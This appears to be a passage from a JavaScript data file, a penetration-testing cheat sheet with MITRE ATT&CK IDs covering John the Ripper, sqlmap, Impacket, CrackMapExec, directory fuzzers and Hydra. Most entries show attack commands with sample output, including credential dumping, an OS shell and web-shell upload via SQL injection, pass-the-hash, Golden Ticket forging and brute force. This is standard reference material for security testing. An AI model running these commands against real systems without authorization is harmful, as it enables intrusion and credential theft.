      description: "List all supported hash formats.",
      flags: { "--list=formats": "Show all supported formats" },
      example: "john --list=formats | grep -i kerberos\nkrb5tgs, krb5asrep, krb5pa-md5",
      category: "Utility",
      mitre: "T1110"
    },
    {
      tool: "john",
      command: "zip2john protected.zip > zip_hash.txt",
      description: "Extract password hash from a password-protected ZIP file for cracking.",
      flags: {},
      example: "zip2john protected.zip > zip_hash.txt\njohn --wordlist=rockyou.txt zip_hash.txt",
      category: "Hash Extraction",
      mitre: "T1110.002"
    },
    {
      tool: "john",
      command: "rar2john protected.rar > rar_hash.txt",
      description: "Extract password hash from a password-protected RAR archive.",
      flags: {},
      example: "rar2john protected.rar > rar_hash.txt\njohn --wordlist=rockyou.txt rar_hash.txt",
      category: "Hash Extraction",
      mitre: "T1110.002"
    },
    {
      tool: "john",
      command: "ssh2john id_rsa > ssh_hash.txt",
      description: "Extract password hash from a passphrase-protected SSH private key.",
      flags: {},
      example: "ssh2john id_rsa > ssh_hash.txt\njohn --wordlist=rockyou.txt ssh_hash.txt",
      category: "Hash Extraction",
      mitre: "T1110.002"
    },
    {
      tool: "john",
      command: "keepass2john database.kdbx > keepass_hash.txt",
      description: "Extract master password hash from a KeePass database file.",
      flags: {},
      example: "keepass2john database.kdbx > keepass_hash.txt\njohn --wordlist=rockyou.txt keepass_hash.txt",
      category: "Hash Extraction",
      mitre: "T1555.005"
    },
    {
      tool: "john",
      command: "pdf2john protected.pdf > pdf_hash.txt",
      description: "Extract password hash from a password-protected PDF document.",
      flags: {},
      example: "pdf2john protected.pdf > pdf_hash.txt\njohn --wordlist=rockyou.txt pdf_hash.txt",
      category: "Hash Extraction",
      mitre: "T1110.002"
    },
    {
      tool: "john",
      command: "unshadow /etc/passwd /etc/shadow > unshadowed.txt",
      description: "Combine passwd and shadow files for John to crack Linux passwords.",
      flags: {},
      example: "unshadow /etc/passwd /etc/shadow > unshadowed.txt\njohn --wordlist=rockyou.txt unshadowed.txt",
      category: "Hash Extraction",
      mitre: "T1003.008"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // SQLMAP
  // ═══════════════════════════════════════════════════════════════════════════
  sqlmap: [
    {
      tool: "sqlmap",
      command: "sqlmap -u 'http://target.com/page?id=1' --dbs",
      description: "Enumerate databases on a URL with a potentially injectable parameter.",
      flags: { "-u": "Target URL with injectable parameter", "--dbs": "Enumerate databases" },
      example: "sqlmap -u 'http://target.com/page?id=1' --dbs\navailable databases [3]:\n[*] information_schema\n[*] mysql\n[*] webapp_db",
      category: "SQL Injection",
      mitre: "T1190"
    },
    {
      tool: "sqlmap",
      command: "sqlmap -u 'http://target.com/page?id=1' -D webapp_db --tables",
      description: "Enumerate tables in a specific database.",
      flags: { "-D": "Target database name", "--tables": "Enumerate tables" },
      example: "sqlmap -u 'http://target.com/page?id=1' -D webapp_db --tables\nDatabase: webapp_db\n[3 tables]\n+----------+\n| users    |\n| products |\n| orders   |",
      category: "SQL Injection",
      mitre: "T1190"
    },
    {
      tool: "sqlmap",
      command: "sqlmap -u 'http://target.com/page?id=1' -D webapp_db -T users --columns",
      description: "Enumerate columns in a specific table.",
      flags: { "-T": "Target table name", "--columns": "Enumerate columns" },
      example: "sqlmap -u 'http://target.com/page?id=1' -D webapp_db -T users --columns\nTable: users\n[4 columns]\n+----------+-------------+\n| id       | int         |\n| username | varchar(50) |\n| password | varchar(255)|\n| email    | varchar(100)|",
      category: "SQL Injection",
      mitre: "T1190"
    },
    {
      tool: "sqlmap",
      command: "sqlmap -u 'http://target.com/page?id=1' -D webapp_db -T users --dump",
      description: "Dump all data from a specific table.",
      flags: { "--dump": "Dump table data" },
      example: "sqlmap -u 'http://target.com/page?id=1' -D webapp_db -T users --dump\n+----+----------+----------------------------------+------------------+\n| id | username | password                         | email            |\n+----+----------+----------------------------------+------------------+\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | admin@target.com |",
      category: "SQL Injection",
      mitre: "T1190"
    },
    {
      tool: "sqlmap",
      command: "sqlmap -u 'http://target.com/page?id=1' --technique=BEUSTQ",
      description: "Specify SQL injection techniques to test: Boolean, Error, Union, Stacked, Time-based, Inline queries.",
      flags: { "--technique": "SQLi technique (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline)" },
      example: "sqlmap -u 'http://target.com/page?id=1' --technique=BEU\n# Tests only Boolean, Error-based, and Union injection",
      category: "SQL Injection",
      mitre: "T1190"
    },
    {
      tool: "sqlmap",
      command: "sqlmap -u 'http://target.com/page?id=1' --tamper=space2comment",
      description: "Use tamper script to evade WAF. space2comment replaces spaces with /**/ comments.",
      flags: { "--tamper": "Tamper script for WAF bypass (comma-separated for multiple)" },
      example: "sqlmap -u 'http://target.com/page?id=1' --tamper=space2comment,charencode\n# Transforms: SELECT * FROM users -> SELECT/**/*/**/FROM/**/users",
      category: "Evasion",
      mitre: "T1190"
    },
    {
      tool: "sqlmap",
      command: "sqlmap -u 'http://target.com/page?id=1' --tamper=charencode",
      description: "URL-encode all characters in the payload to bypass WAF.",
      flags: { "--tamper=charencode": "URL-encode payload characters" },
      example: "sqlmap -u 'http://target.com/page?id=1' --tamper=charencode",
      category: "Evasion",
      mitre: "T1190"
    },
    {
      tool: "sqlmap",
      command: "sqlmap -u 'http://target.com/page?id=1' --tamper=between",
      description: "Replace > with NOT BETWEEN 0 AND to bypass WAF greater-than filters.",
      flags: { "--tamper=between": "Replace comparison operators" },
      example: "sqlmap -u 'http://target.com/page?id=1' --tamper=between",
      category: "Evasion",
      mitre: "T1190"
    },
    {
      tool: "sqlmap",
      command: "sqlmap -u 'http://target.com/page?id=1' --tamper=randomcase",
      description: "Randomize character case in SQL keywords to bypass case-sensitive filters.",
      flags: { "--tamper=randomcase": "Random uppercase/lowercase in keywords" },
      example: "sqlmap -u 'http://target.com/page?id=1' --tamper=randomcase\n# SELECT -> SeLeCt, FROM -> fRoM",
      category: "Evasion",
      mitre: "T1190"
    },
    {
      tool: "sqlmap",
      command: "sqlmap -u 'http://target.com/page?id=1' --os-shell",
      description: "Attempt to get an interactive OS shell through SQL injection.",
      flags: { "--os-shell": "Interactive OS command shell via SQLi" },
      example: "sqlmap -u 'http://target.com/page?id=1' --os-shell\nos-shell> whoami\nwww-data\nos-shell> id\nuid=33(www-data) gid=33(www-data)",
      category: "Command Execution",
      mitre: "T1059"
    },
    {
      tool: "sqlmap",
      command: "sqlmap -u 'http://target.com/page?id=1' --os-cmd='whoami'",
      description: "Execute a single OS command through SQL injection.",
      flags: { "--os-cmd": "Execute single OS command" },
      example: "sqlmap -u 'http://target.com/page?id=1' --os-cmd='cat /etc/passwd'",
      category: "Command Execution",
      mitre: "T1059"
    },
    {
      tool: "sqlmap",
      command: "sqlmap -u 'http://target.com/page?id=1' --file-read='/etc/passwd'",
      description: "Read a file from the target server through SQL injection.",
      flags: { "--file-read": "Read file from server filesystem" },
      example: "sqlmap -u 'http://target.com/page?id=1' --file-read='/etc/passwd'\n[*] /etc/passwd saved to output directory",
      category: "File Access",
      mitre: "T1005"
    },
    {
      tool: "sqlmap",
      command: "sqlmap -u 'http://target.com/page?id=1' --file-write='shell.php' --file-dest='/var/www/html/shell.php'",
      description: "Write a file to the target server through SQL injection.",
      flags: { "--file-write": "Local file to upload", "--file-dest": "Destination path on server" },
      example: "sqlmap -u 'http://target.com/page?id=1' --file-write='shell.php' --file-dest='/var/www/html/shell.php'",
      category: "File Access",
      mitre: "T1105"
    },
    {
      tool: "sqlmap",
      command: "sqlmap -u 'http://target.com/page?id=1' --random-agent --delay=2 --proxy='http://127.0.0.1:8080'",
      description: "Evasion: random User-Agent, 2-second delay between requests, route through proxy.",
      flags: { "--random-agent": "Use random User-Agent header", "--delay": "Seconds between requests", "--proxy": "Route traffic through proxy" },
      example: "sqlmap -u 'http://target.com/page?id=1' --random-agent --delay=2 --proxy='http://127.0.0.1:8080'",
      category: "Evasion",
      mitre: "T1190"
    },
    {
      tool: "sqlmap",
      command: "sqlmap -u 'http://target.com/page?id=1' --tor --tor-type=SOCKS5",
      description: "Route SQLMap traffic through Tor network for anonymity.",
      flags: { "--tor": "Use Tor for anonymity", "--tor-type": "Tor proxy type (HTTP/SOCKS4/SOCKS5)" },
      example: "sqlmap -u 'http://target.com/page?id=1' --tor --tor-type=SOCKS5 --check-tor",
      category: "Evasion",
      mitre: "T1090.003"
    },
    {
      tool: "sqlmap",
      command: "sqlmap -r request.txt --batch",
      description: "Test injection from a saved HTTP request file (from Burp Suite). --batch auto-answers all prompts.",
      flags: { "-r": "Read HTTP request from file", "--batch": "Non-interactive mode, use defaults" },
      example: "sqlmap -r login_request.txt --batch --dbs",
      category: "SQL Injection",
      mitre: "T1190"
    },
    {
      tool: "sqlmap",
      command: "sqlmap -u 'http://target.com/page?id=1' --current-user --current-db --is-dba",
      description: "Get current database user, current database name, and check if user is DBA.",
      flags: { "--current-user": "Current DB user", "--current-db": "Current database", "--is-dba": "Check DBA privileges" },
      example: "sqlmap -u 'http://target.com/page?id=1' --current-user --current-db --is-dba\ncurrent user: 'root@localhost'\ncurrent database: 'webapp_db'\ncurrent user is DBA: True",
      category: "Enumeration",
      mitre: "T1190"
    },
    {
      tool: "sqlmap",
      command: "sqlmap -u 'http://target.com/page?id=1' --passwords",
      description: "Dump database user password hashes.",
      flags: { "--passwords": "Enumerate and dump DB user password hashes" },
      example: "sqlmap -u 'http://target.com/page?id=1' --passwords\ndatabase management system users password hashes:\n[*] root [1]:\n    password hash: *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19",
      category: "Credential Access",
      mitre: "T1003"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // IMPACKET
  // ═══════════════════════════════════════════════════════════════════════════
  impacket: [
    {
      tool: "impacket",
      command: "impacket-secretsdump <domain>/<user>:<password>@<target>",
      description: "Dump secrets from SAM, LSA, and NTDS.dit. The Swiss army knife of credential dumping.",
      flags: {},
      example: "impacket-secretsdump corp.local/admin:P@ss123@10.10.10.5\n[*] Dumping SAM hashes\nAdministrator:500:aad3b435...:31d6cfe0...\n[*] Dumping LSA Secrets\n[*] DPAPI_SYSTEM\n[*] Dumping Domain Credentials (NTDS.dit)",
      category: "Credential Access",
      mitre: "T1003.002"
    },
    {
      tool: "impacket",
      command: "impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL",
      description: "Offline NTDS.dit extraction. Dump hashes from stolen domain controller files.",
      flags: { "-ntds": "NTDS.dit file path", "-system": "SYSTEM registry hive", "-hashes": "Pass-the-hash authentication" },
      example: "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\ncorp.local\\Administrator:500:aad3b435...:31d6cfe0...",
      category: "Credential Access",
      mitre: "T1003.003"
    },
    {
      tool: "impacket",
      command: "impacket-psexec <domain>/<user>:<password>@<target>",
      description: "PsExec-style remote command execution. Creates a service on the target for SYSTEM-level shell access.",
      flags: {},
      example: "impacket-psexec corp.local/admin:P@ss123@10.10.10.5\nC:\\Windows\\system32> whoami\nnt authority\\system",
      category: "Lateral Movement",
      mitre: "T1021.002"
    },
    {
      tool: "impacket",
      command: "impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 <domain>/<user>@<target>",
      description: "PsExec with pass-the-hash. Authenticate using NTLM hash instead of password.",
      flags: { "-hashes": "LM:NT hash pair (use : prefix for NT-only)" },
      example: "impacket-psexec -hashes :31d6cfe0d16ae931 corp.local/admin@10.10.10.5",
      category: "Lateral Movement",
      mitre: "T1550.002"
    },
    {
      tool: "impacket",
      command: "impacket-wmiexec <domain>/<user>:<password>@<target>",
      description: "WMI-based semi-interactive shell. More stealthy than PsExec — no service creation.",
      flags: {},
      example: "impacket-wmiexec corp.local/admin:P@ss123@10.10.10.5\n[*] SMBv3.0 dialect used\nC:\\> whoami\ncorp\\admin",
      category: "Lateral Movement",
      mitre: "T1047"
    },
    {
      tool: "impacket",
      command: "impacket-smbexec <domain>/<user>:<password>@<target>",
      description: "SMB-based semi-interactive shell. Uses a temporary service that runs commands via batch files.",
      flags: {},
      example: "impacket-smbexec corp.local/admin:P@ss123@10.10.10.5",
      category: "Lateral Movement",
      mitre: "T1021.002"
    },
    {
      tool: "impacket",
      command: "impacket-dcomexec <domain>/<user>:<password>@<target>",
      description: "DCOM-based remote command execution. Uses MMC20.Application or ShellBrowserWindow objects.",
      flags: {},
      example: "impacket-dcomexec corp.local/admin:P@ss123@10.10.10.5",
      category: "Lateral Movement",
      mitre: "T1021.003"
    },
    {
      tool: "impacket",
      command: "impacket-atexec <domain>/<user>:<password>@<target> 'command'",
      description: "Execute commands via Windows Task Scheduler (AT). Creates a scheduled task, runs command, retrieves output.",
      flags: {},
      example: "impacket-atexec corp.local/admin:P@ss123@10.10.10.5 'whoami'",
      category: "Lateral Movement",
      mitre: "T1053.005"
    },
    {
      tool: "impacket",
      command: "impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC_IP> -request",
      description: "Kerberoasting — request TGS tickets for service accounts to crack offline.",
      flags: { "-dc-ip": "Domain Controller IP", "-request": "Request TGS tickets" },
      example: "impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.10.10.5 -request\nServicePrincipalName  Name     MemberOf\nMSSQLSvc/db01         svc_sql  Domain Admins\n$krb5tgs$23$*svc_sql$CORP.LOCAL$...",
      category: "Credential Access",
      mitre: "T1558.003"
    },
    {
      tool: "impacket",
      command: "impacket-GetNPUsers <domain>/ -dc-ip <DC_IP> -usersfile users.txt -no-pass",
      description: "AS-REP Roasting — find accounts with Kerberos pre-auth disabled and get crackable hashes.",
      flags: { "-usersfile": "File of usernames to test", "-no-pass": "No password needed for pre-auth disabled accounts" },
      example: "impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.5 -usersfile users.txt -no-pass\n$krb5asrep$23$svc_backup@CORP.LOCAL:...",
      category: "Credential Access",
      mitre: "T1558.004"
    },
    {
      tool: "impacket",
      command: "impacket-ntlmrelayx -tf targets.txt -smb2support",
      description: "NTLM relay attack. Captures NTLM authentication and relays it to target systems.",
      flags: { "-tf": "Targets file", "-smb2support": "Enable SMBv2 support", "-e": "Execute file on relay", "-c": "Execute command on relay" },
      example: "impacket-ntlmrelayx -tf targets.txt -smb2support\n[*] NTLM relay attack started\n[+] Relaying to 10.10.10.5 as CORP\\admin\n[+] SAM dump:\nAdministrator:500:aad3b435...:31d6cfe0...",
      category: "Credential Access",
      mitre: "T1557.001"
    },
    {
      tool: "impacket",
      command: "impacket-smbserver share /tmp/share -smb2support",
      description: "Start a quick SMB file server. Useful for file transfer during engagements.",
      flags: { "-smb2support": "Enable SMBv2" },
      example: "impacket-smbserver share /tmp/share -smb2support\n# On target: copy \\\\attacker_ip\\share\\tool.exe C:\\Windows\\Temp\\",
      category: "File Transfer",
      mitre: "T1105"
    },
    {
      tool: "impacket",
      command: "impacket-getTGT <domain>/<user>:<password>",
      description: "Request a Kerberos TGT (Ticket Granting Ticket) and save it to a ccache file.",
      flags: {},
      example: "impacket-getTGT corp.local/admin:P@ss123\n[*] Saving ticket in admin.ccache\nexport KRB5CCNAME=admin.ccache",
      category: "Credential Access",
      mitre: "T1558.001"
    },
    {
      tool: "impacket",
      command: "impacket-getST <domain>/<user>:<password> -spn <SPN> -impersonate <target_user>",
      description: "Request a Service Ticket, optionally with S4U2Self/S4U2Proxy for impersonation.",
      flags: { "-spn": "Service Principal Name", "-impersonate": "User to impersonate" },
      example: "impacket-getST corp.local/svc_sql:pass -spn cifs/dc01.corp.local -impersonate administrator",
      category: "Credential Access",
      mitre: "T1558"
    },
    {
      tool: "impacket",
      command: "impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain <domain> <username>",
      description: "Create a Golden Ticket — forged TGT using the krbtgt hash for persistent domain access.",
      flags: { "-nthash": "krbtgt NTLM hash", "-domain-sid": "Domain SID", "-domain": "Domain name" },
      example: "impacket-ticketer -nthash aad3b435b51404ee -domain-sid S-1-5-21-1234 -domain corp.local administrator\n[*] Saving ticket in administrator.ccache",
      category: "Persistence",
      mitre: "T1558.001"
    },
    {
      tool: "impacket",
      command: "impacket-lookupsid <domain>/<user>:<password>@<target>",
      description: "Enumerate domain SIDs and RIDs to discover users and groups.",
      flags: {},
      example: "impacket-lookupsid corp.local/user:pass@10.10.10.5\n500: CORP\\Administrator (SidTypeUser)\n501: CORP\\Guest (SidTypeUser)\n512: CORP\\Domain Admins (SidTypeGroup)\n1103: CORP\\svc_sql (SidTypeUser)",
      category: "Enumeration",
      mitre: "T1087.002"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // CRACKMAPEXEC / NETEXEC
  // ═══════════════════════════════════════════════════════════════════════════
  crackmapexec: [
    {
      tool: "crackmapexec",
      command: "crackmapexec smb <target> -u <user> -p <password>",
      description: "Test SMB credentials against a target. Shows if credentials are valid and if user has admin access.",
      flags: { "-u": "Username", "-p": "Password" },
      example: "crackmapexec smb 10.10.10.5 -u admin -p 'P@ss123'\nSMB  10.10.10.5  445  DC01  [*] Windows Server 2019\nSMB  10.10.10.5  445  DC01  [+] CORP\\admin:P@ss123 (Pwn3d!)",
      category: "Authentication",
      mitre: "T1078"
    },
    {
      tool: "crackmapexec",
      command: "crackmapexec smb <target> -u <user> -H <NTLM_hash>",
      description: "Pass-the-hash authentication over SMB.",
      flags: { "-H": "NTLM hash (LM:NT or just NT)" },
      example: "crackmapexec smb 10.10.10.5 -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0\nSMB  10.10.10.5  445  DC01  [+] CORP\\admin (Pwn3d!)",
      category: "Lateral Movement",
      mitre: "T1550.002"
    },
    {
      tool: "crackmapexec",
      command: "crackmapexec smb <subnet> -u <user> -p <password> --shares",
      description: "Enumerate SMB shares across a subnet with valid credentials.",
      flags: { "--shares": "Enumerate shares" },
      example: "crackmapexec smb 10.10.10.0/24 -u admin -p 'P@ss123' --shares\nSMB  10.10.10.5  Share: ADMIN$  READ,WRITE\nSMB  10.10.10.5  Share: C$      READ,WRITE\nSMB  10.10.10.5  Share: backup  READ",
      category: "Enumeration",
      mitre: "T1135"
    },
    {
      tool: "crackmapexec",
      command: "crackmapexec smb <target> -u users.txt -p passwords.txt --no-bruteforce",
      description: "Password spraying. Tests each username with each password but avoids brute-force (user1:pass1, user2:pass2).",
      flags: { "--no-bruteforce": "Pair users and passwords 1:1 instead of trying all combinations" },
      example: "crackmapexec smb 10.10.10.5 -u users.txt -p 'Spring2024!' --continue-on-success",
      category: "Credential Access",
      mitre: "T1110.003"
    },
    {
      tool: "crackmapexec",
      command: "crackmapexec smb <target> -u <user> -p <password> -x 'whoami'",
      description: "Execute a command on the target via SMB.",
      flags: { "-x": "Execute command (uses smbexec)", "-X": "Execute PowerShell command" },
      example: "crackmapexec smb 10.10.10.5 -u admin -p 'P@ss123' -x 'whoami'\nnt authority\\system",
      category: "Execution",
      mitre: "T1059.003"
    },
    {
      tool: "crackmapexec",
      command: "crackmapexec smb <target> -u <user> -p <password> --sam",
      description: "Dump SAM database hashes from a target.",
      flags: { "--sam": "Dump SAM hashes" },
      example: "crackmapexec smb 10.10.10.5 -u admin -p 'P@ss123' --sam\nSAM  Administrator:500:aad3b435...:31d6cfe0...\nSAM  Guest:501:aad3b435...:31d6cfe0...",
      category: "Credential Access",
      mitre: "T1003.002"
    },
    {
      tool: "crackmapexec",
      command: "crackmapexec smb <target> -u <user> -p <password> --lsa",
      description: "Dump LSA secrets from a target.",
      flags: { "--lsa": "Dump LSA secrets" },
      example: "crackmapexec smb 10.10.10.5 -u admin -p 'P@ss123' --lsa",
      category: "Credential Access",
      mitre: "T1003.004"
    },
    {
      tool: "crackmapexec",
      command: "crackmapexec smb <target> -u <user> -p <password> --ntds",
      description: "Dump NTDS.dit from a domain controller to extract all domain password hashes.",
      flags: { "--ntds": "Dump NTDS.dit via drsuapi" },
      example: "crackmapexec smb 10.10.10.5 -u admin -p 'P@ss123' --ntds\nNTDS  corp.local\\Administrator:500:aad3b435...:31d6cfe0...\nNTDS  corp.local\\krbtgt:502:aad3b435...:a1b2c3d4...",
      category: "Credential Access",
      mitre: "T1003.003"
    },
    {
      tool: "crackmapexec",
      command: "crackmapexec smb <target> -u <user> -p <password> -M spider_plus",
      description: "Spider all readable shares and list interesting files (configs, scripts, credentials).",
      flags: { "-M": "Use module", "spider_plus": "Enhanced share spidering module" },
      example: "crackmapexec smb 10.10.10.5 -u admin -p 'P@ss123' -M spider_plus\n[+] Found: \\\\10.10.10.5\\share\\passwords.xlsx\n[+] Found: \\\\10.10.10.5\\share\\config.xml",
      category: "Enumeration",
      mitre: "T1135"
    },
    {
      tool: "crackmapexec",
      command: "crackmapexec smb <target> -u <user> -p <password> --users",
      description: "Enumerate domain users via SMB.",
      flags: { "--users": "Enumerate users" },
      example: "crackmapexec smb 10.10.10.5 -u admin -p 'P@ss123' --users",
      category: "Enumeration",
      mitre: "T1087.002"
    },
    {
      tool: "crackmapexec",
      command: "crackmapexec smb <target> -u <user> -p <password> --groups",
      description: "Enumerate domain groups via SMB.",
      flags: { "--groups": "Enumerate groups" },
      example: "crackmapexec smb 10.10.10.5 -u admin -p 'P@ss123' --groups",
      category: "Enumeration",
      mitre: "T1087.002"
    },
    {
      tool: "crackmapexec",
      command: "crackmapexec smb <target> -u <user> -p <password> --loggedon-users",
      description: "Enumerate currently logged-on users on the target.",
      flags: { "--loggedon-users": "List logged-on users" },
      example: "crackmapexec smb 10.10.10.5 -u admin -p 'P@ss123' --loggedon-users",
      category: "Enumeration",
      mitre: "T1033"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // GOBUSTER / FFUF / FEROXBUSTER
  // ═══════════════════════════════════════════════════════════════════════════
  directory_fuzzing: [
    {
      tool: "gobuster",
      command: "gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
      description: "Directory brute force enumeration. Discover hidden directories and files on web servers.",
      flags: { "dir": "Directory/file mode", "-u": "Target URL", "-w": "Wordlist", "-t": "Threads (default 10)", "-x": "File extensions to search" },
      example: "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html\n/admin                (Status: 301)\n/login.php            (Status: 200)\n/backup               (Status: 403)\n/robots.txt           (Status: 200)",
      category: "Enumeration",
      mitre: "T1595.003"
    },
    {
      tool: "gobuster",
      command: "gobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
      description: "Virtual host enumeration. Discover subdomains served on the same IP via Host header fuzzing.",
      flags: { "vhost": "Virtual host mode", "--append-domain": "Append base domain to words" },
      example: "gobuster vhost -u http://target.com -w subdomains.txt --append-domain\nFound: dev.target.com (Status: 200) [Size: 1234]\nFound: staging.target.com (Status: 302) [Size: 0]",
      category: "Enumeration",
      mitre: "T1595.003"
    },
    {
      tool: "gobuster",
      command: "gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
      description: "DNS subdomain enumeration via brute force.",
      flags: { "dns": "DNS mode", "-d": "Target domain" },
      example: "gobuster dns -d target.com -w subdomains.txt\nFound: www.target.com\nFound: mail.target.com\nFound: api.target.com",
      category: "Enumeration",
      mitre: "T1595.003"
    },
    {
      tool: "ffuf",
      command: "ffuf -u http://target.com/FUZZ -w wordlist.txt",
      description: "Fast web fuzzer. FUZZ keyword marks where the wordlist entry is inserted.",
      flags: { "-u": "Target URL with FUZZ keyword", "-w": "Wordlist", "-mc": "Match HTTP status codes", "-fc": "Filter HTTP status codes", "-fs": "Filter response size", "-t": "Threads" },
      example: "ffuf -u http://10.10.10.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302\nadmin                   [Status: 301, Size: 178]\nlogin                   [Status: 200, Size: 2341]\napi                     [Status: 301, Size: 178]",
      category: "Fuzzing",
      mitre: "T1595.003"
    },
    {
      tool: "ffuf",
      command: "ffuf -u http://target.com/api/user/FUZZ -w numbers.txt -fc 404",
      description: "Fuzz API endpoints for IDOR. Test sequential IDs and filter 404 responses.",
      flags: { "-fc": "Filter out status code 404" },
      example: "ffuf -u http://target.com/api/user/FUZZ -w <(seq 1 1000) -fc 404\n1                       [Status: 200, Size: 456]\n5                       [Status: 200, Size: 389]\n42                      [Status: 200, Size: 512]",
      category: "Fuzzing",
      mitre: "T1190"
    },
    {
      tool: "ffuf",
      command: "ffuf -u http://target.com -H 'Host: FUZZ.target.com' -w subdomains.txt -fs 0",
      description: "Virtual host discovery via Host header fuzzing. Filter empty responses.",
      flags: { "-H": "Custom header", "-fs": "Filter by response size" },
      example: "ffuf -u http://target.com -H 'Host: FUZZ.target.com' -w subdomains.txt -fs 4242\ndev                     [Status: 200, Size: 8901]\nstaging                 [Status: 200, Size: 5632]",
      category: "Enumeration",
      mitre: "T1595.003"
    },
    {
      tool: "ffuf",
      command: "ffuf -u http://target.com/login -X POST -d 'username=admin&password=FUZZ' -w passwords.txt -fc 401",
      description: "POST parameter fuzzing. Brute force login form passwords.",
      flags: { "-X": "HTTP method", "-d": "POST data", "-fc": "Filter status code" },
      example: "ffuf -u http://target.com/login -X POST -d 'username=admin&password=FUZZ' -w rockyou.txt -fc 401\npassword123             [Status: 302, Size: 0]",
      category: "Credential Access",
      mitre: "T1110.001"
    },
    {
      tool: "feroxbuster",
      command: "feroxbuster -u http://target.com -w wordlist.txt --depth 3",
      description: "Recursive directory brute force. Automatically discovers and scans subdirectories.",
      flags: { "-u": "Target URL", "-w": "Wordlist", "--depth": "Recursion depth", "-x": "File extensions", "-t": "Threads", "--filter-status": "Filter status codes" },
      example: "feroxbuster -u http://10.10.10.5 -w common.txt --depth 3 -x php,txt\n200  GET  /admin/\n200  GET  /admin/config.php\n200  GET  /admin/backup/db.sql",
      category: "Enumeration",
      mitre: "T1595.003"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // HYDRA
  // ═══════════════════════════════════════════════════════════════════════════
  hydra: [
    {
      tool: "hydra",
      command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target",
      description: "Brute force SSH login with a single username and password wordlist.",
      flags: { "-l": "Single username", "-P": "Password wordlist", "-t": "Threads (default 16)", "-f": "Stop on first valid pair", "-V": "Verbose — show each attempt" },
      example: "hydra -l admin -P rockyou.txt -t 4 ssh://10.10.10.5\n[22][ssh] host: 10.10.10.5   login: admin   password: letmein",
      category: "Credential Access",
      mitre: "T1110.001"
    },
    {
      tool: "hydra",
      command: "hydra -L users.txt -P passwords.txt ftp://target",
      description: "Brute force FTP login with username and password lists.",
      flags: { "-L": "Username wordlist" },
      example: "hydra -L users.txt -P passwords.txt ftp://10.10.10.5\n[21][ftp] host: 10.10.10.5   login: ftpuser   password: ftp123",
      category: "Credential Access",
      mitre: "T1110.001"
    },
    {
      tool: "hydra",
      command: "hydra -l admin -P passwords.txt target http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials'",
      description: "Brute force HTTP POST login form. ^USER^ and ^PASS^ are replaced with candidates; third field is the failure string.",
      flags: { "http-post-form": "HTTP POST form attack", "^USER^": "Username placeholder", "^PASS^": "Password placeholder" },
      example: "hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form '/login:username=^USER^&password=^PASS^:Invalid'\n[80][http-post-form] host: 10.10.10.5   login: admin   password: admin123",
      category: "Credential Access",
      mitre: "T1110.001"
    },
    {
      tool: "hydra",
      command: "hydra -l admin -P passwords.txt rdp://target",
      description: "Brute force RDP (Remote Desktop Protocol) login.",
      flags: {},
      example: "hydra -l administrator -P passwords.txt rdp://10.10.10.5",
      category: "Credential Access",
      mitre: "T1110.001"
    },
    {
      tool: "hydra",
      command: "hydra -l admin -P passwords.txt smb://target",
      description: "Brute force SMB login.",
      flags: {},
      example: "hydra -l admin -P passwords.txt smb://10.10.10.5",
      category: "Credential Access",
      mitre: "T1110.001"
    },
    {
      tool: "hydra",
      command: "hydra -l root -P passwords.txt mysql://target",
      description: "Brute force MySQL database login.",
      flags: {},
      example: "hydra -l root -P passwords.txt mysql://10.10.10.5\n[3306][mysql] host: 10.10.10.5   login: root   password: mysql123",
      category: "Credential Access",
      mitre: "T1110.001"
    },
    {
      tool: "hydra",
      command: "hydra -l sa -P passwords.txt mssql://target",
      description: "Brute force Microsoft SQL Server login.",
      flags: {},
      example: "hydra -l sa -P passwords.txt mssql://10.10.10.5",
      category: "Credential Access",
      mitre: "T1110.001"
    },
    {
      tool: "hydra",
      command: "hydra -P passwords.txt vnc://target",
      description: "Brute force VNC server password. VNC often uses password-only auth.",
      flags: {},
      example: "hydra -P passwords.txt vnc://10.10.10.5\n[5900][vnc] host: 10.10.10.5   password: vnc123",
      category: "Credential Access",
      mitre: "T1110.001"
    },
    {
      tool: "hydra",
      command: "hydra -l admin -P passwords.txt telnet://target",
      description: "Brute force Telnet login.",
      flags: {},
      example: "hydra -l admin -P passwords.txt telnet://10.10.10.5",
      category: "Credential Access",
      mitre: "T1110.001"
    },
    {
      tool: "hydra",
      command: "hydra -l admin -P passwords.txt smtp://target",
      description: "Brute force SMTP authentication.",
      flags: {},
      example: "hydra -l admin -P passwords.txt smtp://mail.target.com",
      category: "Credential Access",
      mitre: "T1110.001"
    },
    {
      tool: "hydra",
      command: "hydra -l user@target.com -P passwords.txt -s 993 imap://target",
      description: "Brute force IMAP email login on custom port.",
      flags: { "-s": "Custom port number" },
      example: "hydra -l user@target.com -P passwords.txt -s 993 imap://mail.target.com",
      category: "Credential Access",
      mitre: "T1110.001"
    },
    {
      tool: "hydra",
      command: "hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://target",
